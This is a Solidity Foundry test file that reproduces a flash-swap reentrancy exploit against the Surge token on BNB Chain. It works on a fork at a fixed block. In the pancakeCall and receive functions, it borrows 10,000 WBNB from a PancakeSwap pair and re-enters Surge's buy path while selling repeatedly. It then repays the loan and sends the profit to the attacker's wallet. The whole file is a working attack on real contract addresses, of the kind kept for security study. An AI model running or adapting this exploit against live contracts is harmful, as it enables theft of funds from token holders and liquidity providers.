// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./interface.sol";

interface IpancakePair {
  function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data
  ) external;

  function token0() external view returns (address);

  function token1() external view returns (address);
}

interface Token {
  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ContractTest is DSTest {
  IpancakePair ipancake =
    IpancakePair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
  IWBNB wbnb = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
  Surge surge = Surge(0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21);
  address public constant Surge_Address =
    0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21;
  address private constant Pancake_Pair_Address =
    0x0eD7e52944161450477ee417DE9Cd3a859b14fD0;
  address public mywallet = msg.sender;
  uint8 public time = 0;
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  function setUp() public {
    cheats.createSelectFork("bsc", 10087723); // fork bsc at block 10087723
  }

  function testExploit() public {
    payable(address(0)).transfer(address(this).balance);
    ipancake.swap(0, 10000 * 1e18, address(this), "0x00");
    // wbnb.withdraw(wbnb.balanceOf(address(this)));
    // VISR_Balance =  visr.balanceOf(msg.sender);
    //emit log_named_uint("WBNB Balance",wbnb.balanceOf(address(this)));
    emit log_named_uint(
      "Exploit completed, WBNB Balance",
      wbnb.balanceOf(mywallet)
    );
  }

  function pancakeCall(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
  ) external {
    wbnb.withdraw(wbnb.balanceOf(address(this)));

    (bool buy_successful, ) = payable(Surge_Address).call{
      value: address(this).balance,
      gas: 40000
    }("");

    surge.sell(surge.balanceOf(address(this)));
    surge.sell(surge.balanceOf(address(this)));
    surge.sell(surge.balanceOf(address(this)));
    surge.sell(surge.balanceOf(address(this)));
    surge.sell(surge.balanceOf(address(this)));
    surge.sell(surge.balanceOf(address(this)));
    surge.sell(surge.balanceOf(address(this)));

    wbnb.deposit{ value: address(this).balance }();

    wbnb.transfer(Pancake_Pair_Address, 10030 * 1e18);
    wbnb.transfer(mywallet, wbnb.balanceOf(address(this)));
  }

  receive() external payable {
    if (msg.sender == Surge_Address && time < 6) {
      (bool buy_successful, ) = payable(Surge_Address).call{
        value: address(this).balance,
        gas: 40000
      }("");

      time++;
    }
  }
}
